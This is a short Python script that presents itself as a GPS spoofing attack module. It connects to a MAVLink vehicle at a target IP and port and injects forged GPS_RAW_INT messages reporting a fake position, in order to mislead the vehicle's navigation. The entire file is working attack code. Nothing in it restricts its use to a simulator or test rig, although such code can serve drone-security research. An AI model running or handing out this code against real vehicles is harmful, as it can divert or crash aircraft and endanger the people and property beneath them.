#!/usr/bin/env python3
"""
GPS Spoofing Attack Module

Sends fake GPS coordinates to mislead navigation system.
"""
import time
import sys
from pymavlink import mavutil

def attack_gps_spoofing(mav, fake_lat: float, fake_lon: float, fake_alt: float, count: int = 10):
    """
    Send fake GPS coordinates
    
    Args:
        mav: MAVLink connection
        fake_lat: Spoofed latitude (degrees)
        fake_lon: Spoofed longitude (degrees)
        fake_alt: Spoofed altitude (meters)
        count: Number of spoofed messages to send
    """
    print(f"[GPS SPOOF] Sending {count} fake GPS messages...")
    print(f"[GPS SPOOF] Fake Position: Lat={fake_lat}, Lon={fake_lon}, Alt={fake_alt}m")
    
    for i in range(count):
        try:
            mav.mav.gps_raw_int_send(
                time_usec=int(time.time() * 1e6),
                fix_type=3,  # 3D fix
                lat=int(fake_lat * 1e7),
                lon=int(fake_lon * 1e7),
                alt=int(fake_alt * 1000),
                eph=100,
                epv=100,
                vel=500,
                cog=18000,
                satellites_visible=12
            )
            print(f"[GPS SPOOF] Message {i+1}/{count} sent")
            time.sleep(0.5)
        except Exception as e:
            print(f"[GPS SPOOF] Error: {e}")
            break
    
    print(f"[GPS SPOOF] Attack complete!")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python gps_spoof.py <target_ip> <target_port> [lat] [lon] [alt]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    lat = float(sys.argv[3]) if len(sys.argv) > 3 else 37.7749
    lon = float(sys.argv[4]) if len(sys.argv) > 4 else -122.4194
    alt = float(sys.argv[5]) if len(sys.argv) > 5 else 1000
    
    connection_string = f'udpout:{target_ip}:{target_port}'
    mav = mavutil.mavlink_connection(connection_string, source_system=255, source_component=190)
    
    time.sleep(1)
    attack_gps_spoofing(mav, lat, lon, alt)
